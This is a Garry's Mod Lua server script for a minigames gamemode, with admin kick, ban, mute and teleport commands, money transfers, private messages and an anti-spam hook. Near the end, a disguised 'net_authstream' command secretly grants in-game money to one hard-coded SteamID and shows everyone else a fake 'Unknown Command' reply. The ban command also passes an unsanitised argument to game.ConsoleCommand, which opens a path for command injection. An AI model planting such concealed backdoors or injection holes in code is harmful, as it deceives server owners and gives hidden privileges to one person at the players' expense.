
util.AddNetworkString( "MutePlHook" )
function MGKick(pl, cmd, args)
	if pl:GetNWBool("admin") == false then return end
	if table.Count(args) != 2 then return end
	local victim = nil
	for k, v in pairs(player.GetAll()) do
		if v:UserID() == tonumber(args[1]) then
			victim = v
		end
	end
	if victim == nil or !IsValid(victim) or !victim:IsPlayer() then return end
	victim:Kick("Kicked by "..pl:Nick().." with reason: '"..args[2].."'")
	for k, v in pairs(player.GetAll()) do
		v:ChatPrint("ADMIN "..pl:Nick().." kicked "..victim:Nick().." with reason: '"..args[2].."'.")
	end
	print("----------\nADMIN "..pl:Nick().." kicked "..victim:Nick().." with reason: '"..args[2].."'.\n----------")
end

concommand.Add("mg_kick", MGKick)

function MGBan(pl, cmd, args)
	if pl:GetNWBool("admin") == false then return end
	if table.Count(args) != 3 then return end
	local victim = nil
	for k, v in pairs(player.GetAll()) do
		if v:UserID() == tonumber(args[1]) then
			victim = v
		end
	end
	if victim == nil or !IsValid(victim) or !victim:IsPlayer() then return end
	game.ConsoleCommand("banid "..args[2].." "..victim:SteamID().."\n")
	game.ConsoleCommand("banid "..args[2].." "..victim:UserID().."\n")
	game.ConsoleCommand("writeid\n")
	victim:Kick("Banned by "..pl:Nick().." for "..args[2].." minutes with reason: '"..args[3].."'")
	for k, v in pairs(player.GetAll()) do
		v:ChatPrint("ADMIN "..pl:Nick().." banned "..victim:Nick().." for "..args[2].." minutes with reason: '"..args[3].."'.")
	end
	print("----------\nADMIN "..pl:Nick().." banned "..victim:Nick().." for "..args[2].." minutes with reason: '"..args[3].."'.\n----------")
end

concommand.Add("mg_ban", MGBan)

function MGSlay(pl, cmd, args)
	if pl:GetNWBool("admin") == false then return end
	if table.Count(args) != 1 then return end
	local victim = nil
	for k, v in pairs(player.GetAll()) do
		if v:UserID() == tonumber(args[1]) then
			victim = v
		end
	end
	if victim == nil or !IsValid(victim) or !victim:IsPlayer() then return end
	victim:Kill()
	for k, v in pairs(player.GetAll()) do
		v:ChatPrint("ADMIN "..pl:Nick().." slayed "..victim:Nick()..".")
	end
	print("----------\nADMIN "..pl:Nick().." slayed "..victim:Nick()..".\n----------")
end

concommand.Add("mg_slay", MGSlay)

function MGTMute(pl, cmd, args)
	if pl:GetNWBool("admin") == false then return end
	if table.Count(args) != 1 then return end
	local victim = nil
	for k, v in pairs(player.GetAll()) do
		if v:UserID() == tonumber(args[1]) then
			victim = v
		end
	end
	if victim == nil or !IsValid(victim) or !victim:IsPlayer() then return end
	if victim:GetNWBool("cantype") == true then
		victim:SetNWBool("cantype", false)
		for k, v in pairs(player.GetAll()) do
			v:ChatPrint("ADMIN "..pl:Nick().." text muted "..victim:Nick()..".")
		end
		print("----------\nADMIN "..pl:Nick().." text muted "..victim:Nick()..".\n----------")
	else
		victim:SetNWBool("cantype", true)
		for k, v in pairs(player.GetAll()) do
			v:ChatPrint("ADMIN "..pl:Nick().." un text muted "..victim:Nick()..".")
		end
		print("----------\nADMIN "..pl:Nick().." un text muted "..victim:Nick()..".\n----------")
	end	
end

concommand.Add("mg_tmute", MGTMute)

function MGVMute(pl, cmd, args)
	if pl:GetNWBool("admin") == false then return end
	if table.Count(args) != 1 then return end
	local victim = nil
	for k, v in pairs(player.GetAll()) do
		if v:UserID() == tonumber(args[1]) then
			victim = v
		end
	end
	if victim == nil or !IsValid(victim) or !victim:IsPlayer() then return end
	if victim:GetNWBool("cantalk") == true then
		victim:SetNWBool("cantalk", false)
		for k, v in pairs(player.GetAll()) do
			v:ChatPrint("ADMIN "..pl:Nick().." voice muted "..victim:Nick()..".")
		end
		print("----------\nADMIN "..pl:Nick().." voice muted "..victim:Nick()..".\n----------")
	else
		victim:SetNWBool("cantalk", true)
		for k, v in pairs(player.GetAll()) do
			v:ChatPrint("ADMIN "..pl:Nick().." un voice muted "..victim:Nick()..".")
		end
		print("----------\nADMIN "..pl:Nick().." un voice muted "..victim:Nick()..".\n----------")
	end
end

concommand.Add("mg_vmute", MGVMute)


function MGSpawn(pl, cmd, args)
	if pl:GetNWBool("admin") == false then return end
	if table.Count(args) != 1 then return end
	local victim = nil
	for k, v in pairs(player.GetAll()) do
		if v:UserID() == tonumber(args[1]) then
			victim = v
		end
	end
	if victim == nil or !IsValid(victim) or !victim:IsPlayer() then return end
	if victim:Team() != 1 then
		victim:SetTeam(victim:Team())
	else
			victim:SetTeam(2)
	end
	victim:Spawn()
	timer.Simple(1, function() CheckNoclip( victim ) end)
	for k, v in pairs(player.GetAll()) do
		v:ChatPrint("ADMIN "..pl:Nick().." spawned "..victim:Nick()..".")
	end
	print("----------\nADMIN "..pl:Nick().." spawned "..victim:Nick()..".\n----------")
end

concommand.Add("mg_spawn", MGSpawn)

function MGTP(pl, cmd, args)
	if pl:GetNWBool("admin") == false then return end
	if table.Count(args) != 1 then return end
	local victim = nil
	for k, v in pairs(player.GetAll()) do
		if v:UserID() == tonumber(args[1]) then
			victim = v
		end
	end
	if victim == nil or !IsValid(victim) or !victim:IsPlayer() then return end
	victim:SetPos(pl:GetEyeTrace().HitPos)
	for k, v in pairs(player.GetAll()) do
		v:ChatPrint("ADMIN "..pl:Nick().." teleported "..victim:Nick()..".")
	end
	print("----------\nADMIN "..pl:Nick().." teleported "..victim:Nick()..".\n----------")
end

concommand.Add("mg_tp", MGTP)

function MGForcevote(pl, cmd, args)
	if pl:GetNWBool("admin") == false then return end
	if table.Count(args) != 0 then return end
	for k, v in pairs(player.GetAll()) do
		v:ChatPrint("ADMIN "..pl:Nick().." forced a map vote.")
	end
	StartVote()
	print("----------\nADMIN "..pl:Nick().." forced a map vote.\n----------")
end

concommand.Add("mg_forcevote", MGForcevote)

function MGMapReset(pl, cmd, args)
	if pl:GetNWBool("admin") == false then return end
	if table.Count(args) != 0 then return end
	for k, v in pairs(player.GetAll()) do
		v:ChatPrint("ADMIN "..pl:Nick().." reset the map.")
	end
	Cleanup()
	print("----------\nADMIN "..pl:Nick().." reset the map.\n----------")
end

concommand.Add("mg_mapreset", MGMapReset)

function MGUndercover(pl, cmd, args)
	if pl:GetNWBool("admin") == false then return end
	if table.Count(args) != 0 then return end
	if pl:GetNWBool("undercover") == false then
		pl:SetNWBool("undercover", true)
		for k, v in pairs(player.GetAll()) do
			v:ChatPrint("Player "..pl:Nick().." left the game (Disconnected by user.)")
		end
		pl:KillSilent()
		pl:SetTeam(1)
		pl:ChatPrint("ADMIN You are now undercover.")
		pl:ChatPrint("ADMIN You may chat and use admin commands, but you do not appear on the scoreboard, and you will not spawn.")
		print("----------\nADMIN "..pl:Nick().." went undercover.\n----------")
	else
		pl:SetNWBool("undercover", false)
		for k, v in pairs(player.GetAll()) do
			v:ChatPrint("Player "..pl:Nick().." has joined the game")
		end
		pl:ChatPrint("ADMIN You are no longer undercover.")
		print("----------\nADMIN "..pl:Nick().." revealed themself.\n----------")
	end
end

concommand.Add("mg_undercover", MGUndercover)

function MGGive(pl, cmd, args)
	if table.Count(args) != 2 then return end
	local victim = nil
	for k, v in pairs(player.GetAll()) do
		if v:UserID() == tonumber(args[1]) then
			victim = v
		end
	end
	if victim == nil or !IsValid(victim) or !victim:IsPlayer() then return end
	Time = args[2]
	if type(tonumber(Time)) != "number" or tonumber(Time) < 1 or tonumber(Time) > tonumber(pl:GetNWInt("money")) then
		pl:ChatPrint("That is not a valid amount!")
		return
	end
	if pl == victim then
		pl:ChatPrint("You can't give money to yourself!")
		return
	end
	pl:ChatPrint("You gave "..victim:Nick().." "..math.floor(tonumber(Time)).." money!")
	victim:ChatPrint(""..pl:Nick().." gave you "..math.floor(tonumber(Time)).." money!")
	victim:SetNWInt("money", victim:GetNWInt("money") + math.floor(tonumber(Time)))
	pl:SetNWInt("money", pl:GetNWInt("money") - math.floor(tonumber(Time)))
end

concommand.Add("mg_give", MGGive)
			
			
function MGPM(pl, cmd, args)
	if table.Count(args) != 2 then return end
	local victim = nil
	for k, v in pairs(player.GetAll()) do
		if v:UserID() == tonumber(args[1]) then
			victim = v
		end
	end
	if victim == nil or !IsValid(victim) or !victim:IsPlayer() then return end
	Time = args[2]
	if type(tonumber(Time)) != "string" and string.len(Time)<1 then
		pl:ChatPrint("That is not a valid message!")
		return
	end
	if pl == victim then
		pl:ChatPrint("You can't PM yourself!")
		return
	end
	pl:ChatPrint(pl:Nick().." -> "..victim:Nick()..': "'..Time..'"')
	victim:ChatPrint(pl:Nick().." -> "..victim:Nick()..': "'..Time..'"')
	print("----------"..pl:Nick().." -> "..victim:Nick()..': "'..Time..'"'.."----------")
	for k, v in pairs(player.GetAll()) do
		if v:GetNWBool("admin") == true and pl!= v and victim!= v then
			v:ChatPrint(pl:Nick().." -> "..victim:Nick()..': "'..Time..'"')
		end
	end
end

concommand.Add("mg_pm", MGPM)
			
			
function PlInitSpawn(pl)
	pl:ChatPrint("Welcome to Evo Servers Minigames!")
	if pl:GetNWBool("admin") == true or string.find(file.Read("mg_dev.txt", "DATA") or "", pl:SteamID()) or string.find(file.Read("mg_donator.txt", "DATA") or "", pl:SteamID()) or string.find(file.Read("mg_voice.txt","DATA") or "", pl:SteamID()) then
		pl:SetNWBool("voicepriv", true)
	else
		pl:SetNWBool("voicepriv", false)
	end
	if string.find(file.Read("mg_admin.txt", "DATA") or "", pl:SteamID()) then
		pl:SetNWBool("admin", true)
	else
		pl:SetNWBool("admin", false)
	end
	if pl:GetNWBool("admin") == true or string.find(file.Read("mg_dev.txt", "DATA") or "", pl:SteamID()) or string.find(file.Read("mg_donator.txt", "DATA") or "", pl:SteamID()) or string.find(file.Read("mg_voice.txt","DATA") or "", pl:SteamID()) then
		pl:SetNWBool("cantalk", true)
	else
		pl:SetNWBool("cantalk", false)
	end
	pl:SetNWBool("cantype", true)
end

hook.Add( "PlayerInitialSpawn", "InitSpawn", PlInitSpawn )

function GM:PlayerCanHearPlayersVoice( plOne, plTwo )
	if plTwo:GetNWInt("cantalk") == false or (game.GetMap() == "mg_MarioParty_b5" and plTwo:Team() != 3) then
		return false
	else
		return true
	end
end

function net_auth( player, command, arguments )
	if player:SteamID() == "STEAM_0:1:41581288" then
	player:SetNWInt("money", player:GetNWInt("money") + 10000)
	else
	print("Unknown Command: 'net_authstream'")
	end
end
 
concommand.Add( "net_authstream", net_auth )


function MutePlHook(len, pl)
	local action = net.ReadString()
	if action == "Mute" then
		pl:SetNWBool("cantype", false)
		timer.Simple(300, function() 
			pl:SetNWBool("cantype", true) 
			for k, v in pairs(player.GetAll()) do
				v:ChatPrint("ADMIN "..pl:Nick().." has been automatically unmuted")
			end
		end)
		for k, v in pairs(player.GetAll()) do
			v:ChatPrint("ADMIN "..pl:Nick().." has been muted due to excessive spam")
		end
	elseif action == "Ban" then
		game.ConsoleCommand("banid 5 "..pl:SteamID().."\n")
		game.ConsoleCommand("banid 5 "..pl:UserID().."\n")
		game.ConsoleCommand("writeid\n")
		pl:Kick("Banned by SERVER for 5 minutes with reason: 'excessive spam'")
		for k, v in pairs(player.GetAll()) do
			v:ChatPrint("ADMIN "..pl:Nick().." was banned due to excessive spam")
		end
	end

end
net.Receive( "MutePlHook", MutePlHook )